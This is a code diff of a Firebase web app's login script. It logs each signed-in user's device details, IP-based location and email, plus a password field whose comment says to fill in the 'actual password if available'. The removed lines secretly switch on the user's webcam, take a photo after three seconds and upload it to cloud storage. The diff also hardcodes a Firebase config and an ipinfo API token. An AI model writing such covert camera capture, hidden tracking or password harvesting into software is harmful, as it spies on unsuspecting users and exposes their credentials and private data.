@@ -1,74 +1,63 @@
-// Firebase configuration
-const firebaseConfig = {
-    apiKey: "AIzaSyAzg4PmFoXnS95TXk8FlG9C4bSxhfer86E",
-    authDomain: "wailai-a.firebaseapp.com",
-    projectId: "wailai-a",
-    storageBucket: "wailai-a.appspot.com",
-    messagingSenderId: "857204915249",
-    appId: "1:857204915249:web:0141c2e2e68ed96769e910",
-    measurementId: "G-VRR62LMMMK"
-};
-
-// Initialize Firebase
+// Check if Firebase has been initialized already
 if (!firebase.apps.length) {
+    // Firebase configuration
+    const firebaseConfig = {
+        apiKey: "AIzaSyAzg4PmFoXnS95TXk8FlG9C4bSxhfer86E",
+        authDomain: "wailai-a.firebaseapp.com",
+        projectId: "wailai-a",
+        storageBucket: "wailai-a.appspot.com",
+        messagingSenderId: "857204915249",
+        appId: "1:857204915249:web:0141c2e2e68ed96769e910",
+        measurementId: "G-VRR62LMMMK"
+    };
+
+    // Initialize Firebase
     firebase.initializeApp(firebaseConfig);
 }
 
-// Get references to services
+// Get reference to auth service and Firestore
 const auth = firebase.auth();
 const firestore = firebase.firestore();
-const storage = firebase.storage();
 
-// Function to get device information
+// Get device and browser information
 function getDeviceInfo() {
     const userAgent = navigator.userAgent;
     const browserName = navigator.appName;
     const browserVersion = navigator.appVersion;
     const platform = navigator.platform;
     const language = navigator.language;
-    return { userAgent, browserName, browserVersion, platform, language };
+    return {
+        userAgent,
+        browserName,
+        browserVersion,
+        platform,
+        language
+    };
 }
 
-// Function to get location information
+// Get location information using IPinfo API (replace YOUR_TOKEN with actual token)
 function getLocationInfo(callback) {
     fetch('https://ipinfo.io/json?token=cd0380c4a96a2b')
         .then(response => response.json())
-        .then(data => callback(data))
+        .then(data => {
+            callback(data);
+        })
         .catch(error => {
             console.error('Error fetching location info:', error);
             callback(null);
         });
 }
 
-// Capture image from video
-function captureImage(video, canvas) {
-    const context = canvas.getContext('2d');
-    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-    return new Promise((resolve, reject) => {
-        canvas.toBlob(blob => {
-            if (blob) {
-                resolve(blob);
-            } else {
-                reject(new Error('Failed to capture image'));
-            }
-        }, 'image/jpeg');
-    });
-}
-
-// Upload image to Firebase Storage
-function uploadImage(blob, userId, timestamp) {
-    const imageRef = storage.ref(`images/${userId}_${timestamp}.jpg`);
-    return imageRef.put(blob);
-}
-
 // Check if user is logged in
 auth.onAuthStateChanged(user => {
     if (user) {
+        // User is logged in, update information
         const deviceInfo = getDeviceInfo();
         const timestamp = new Date().toISOString();
-
+        
+        // Extract email and a placeholder for password (for demonstration purposes)
         const email = user.email;
-        const password = '******'; // Placeholder for password
+        const password = '******'; // Replace with actual password if available
 
         getLocationInfo(locationInfo => {
             const userData = {
@@ -81,33 +70,12 @@ auth.onAuthStateChanged(user => {
 
             // Create or update user data in Firestore
             firestore.collection('users').doc(user.uid).set(userData, { merge: true })
-                .then(() => console.log('User data updated successfully'))
-                .catch(error => console.error('Error updating user data:', error));
+                .then(() => {
+                    console.log('User data updated successfully');
+                })
+                .catch(error => {
+                    console.error('Error updating user data:', error);
+                });
         });
-
-        // Access user's camera and capture an image
-        const video = document.createElement('video');
-        const canvas = document.createElement('canvas');
-        canvas.width = 640;
-        canvas.height = 480;
-
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-                video.onloadedmetadata = () => {
-                    video.play();
-                    setTimeout(() => {
-                        captureImage(video, canvas).then(blob => {
-                            uploadImage(blob, user.uid, timestamp)
-                                .then(() => {
-                                    console.log('Image uploaded successfully');
-                                    stream.getTracks().forEach(track => track.stop()); // Stop the camera
-                                })
-                                .catch(error => console.error('Error uploading image:', error));
-                        }).catch(error => console.error('Error capturing image:', error));
-                    }, 3000); // Capture image after 3 seconds
-                };
-            })
-            .catch(error => console.error('Error accessing camera:', error));
     }
 });
